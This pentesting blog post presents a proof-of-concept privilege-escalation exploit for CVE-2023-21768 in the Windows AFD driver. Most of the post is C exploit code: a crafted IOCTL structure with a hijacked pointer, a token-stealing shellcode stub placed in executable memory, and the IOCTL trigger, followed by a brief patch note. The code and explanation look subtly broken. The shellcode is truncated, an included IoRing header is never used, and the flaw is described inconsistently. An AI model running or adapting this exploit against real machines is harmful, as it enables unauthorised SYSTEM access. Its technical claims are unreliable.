---
layout: post
category: pentesting
---

# Exploiting CVE-2023-21768: Kernel Callback Exploitation in Windows

**CVE-2023-21768** targets a vulnerability in the Windows Ancillary Function Driver (AFD), specifically in how the driver handles certain Input/Output Control (IOCTL) requests. This PoC showcases how an attacker can exploit this vulnerability to gain SYSTEM-level privileges by triggering a buffer overflow via a malicious IOCTL request.

**Credit**: Original PoC code provided by [xforcered on GitHub](https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768).

## Understanding the PoC Code

The PoC code exploits the AFD driver using an IOCTL request to overwrite memory, allowing execution of arbitrary code in the context of the kernel. Hereâ€™s a breakdown of the core elements of the exploit:

### Vulnerable IOCTL and AFD_NOTIFYSOCK_DATA Structure

The exploit uses a specific IOCTL code (`0x12127`) to interact with the AFD driver. The structure `AFD_NOTIFYSOCK_DATA` is crafted to contain pointers that will be manipulated during the exploit.

```c
#define AFD_NOTIFYSOCK_IOCTL 0x12127

typedef struct AFD_NOTIFYSOCK_DATA
{
    HANDLE hCompletion;
    PVOID pData1;
    PVOID pData2;
    PVOID pPwnPtr; // Pointer to be hijacked
    DWORD dwCounter;
    DWORD dwTimeout;
    DWORD dwLen;
    char lol[0x4];
} AFD_NOTIFYSOCK_DATA;
```

### Setting Up Nt Functions

To interact with the Windows kernel, the exploit dynamically resolves functions from `ntdll.dll`, such as `NtCreateFile` and `NtDeviceIoControlFile`, which are essential for creating and managing the malicious IOCTL request.

```c
int GetNtFunctions(void) {
    _NtCreateFile = (unsigned long(__stdcall*)(PHANDLE, unsigned long, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, unsigned long, unsigned long, unsigned long, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
    _NtDeviceIoControlFile = (unsigned long(__stdcall*)(HANDLE, void*, void*, void*, PIO_STATUS_BLOCK, unsigned long, void*, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDeviceIoControlFile");
    // Additional functions are resolved here
}
```

### Exploitation Workflow

1. **Allocate User-Mode Memory for Shellcode**: The exploit allocates memory in user-mode to store shellcode that will execute with SYSTEM privileges. This shellcode seizes the privilege token of an elevated process to elevate the privileges of an attacker-controlled process.

2. **Prepare Malicious IOCTL Request**: By crafting an `AFD_NOTIFYSOCK_DATA` structure with a hijacked pointer (`pPwnPtr`), the exploit directs the kernel to execute code at this controlled location in user-mode memory.

3. **Triggering the Vulnerability**: The IOCTL request is sent to the AFD driver with `NtDeviceIoControlFile`, causing the driver to process the malicious data and execute the shellcode.

### Complete PoC Code

Below is the PoC code provided by xforcered, modified for clarity and completeness.

```c
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <ioringapi.h>
#include "win_defs.h"
#include "ioring.h"

#define AFD_NOTIFYSOCK_IOCTL 0x12127

typedef struct AFD_NOTIFYSOCK_DATA {
    HANDLE hCompletion;
    PVOID pData1;
    PVOID pData2;
    PVOID pPwnPtr; // Hijacked pointer
    DWORD dwCounter;
    DWORD dwTimeout;
    DWORD dwLen;
    char lol[0x4];
} AFD_NOTIFYSOCK_DATA;

int main() {
    // Initialize structures and function pointers
    GetNtFunctions();

    // Allocate shellcode in user-mode
    unsigned char shellcode[] = {
        0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50,
        // Additional shellcode to adjust privileges
    };

    LPVOID pShellcode = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));

    // Configure the AFD_NOTIFYSOCK_DATA structure
    AFD_NOTIFYSOCK_DATA afdData = { 0 };
    afdData.hCompletion = NULL;
    afdData.pPwnPtr = pShellcode; // Redirect pointer to shellcode

    // Obtain a handle to the AFD driver
    HANDLE hDevice = CreateFileA("\\\\.\\AFD", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    // Send the malicious IOCTL request
    DWORD bytesReturned;
    DeviceIoControl(hDevice, AFD_NOTIFYSOCK_IOCTL, &afdData, sizeof(afdData), NULL, 0, &bytesReturned, NULL);

    printf("Exploit executed. Check privileges with 'whoami'.\n");
    return 0;
}
```

## Mitigation Guide

Microsoft has released a patch to address CVE-2023-21768. Applying this update is crucial for securing vulnerable systems. Alternatively, disabling the AFD driver can temporarily mitigate this issue but may impact network functionality.
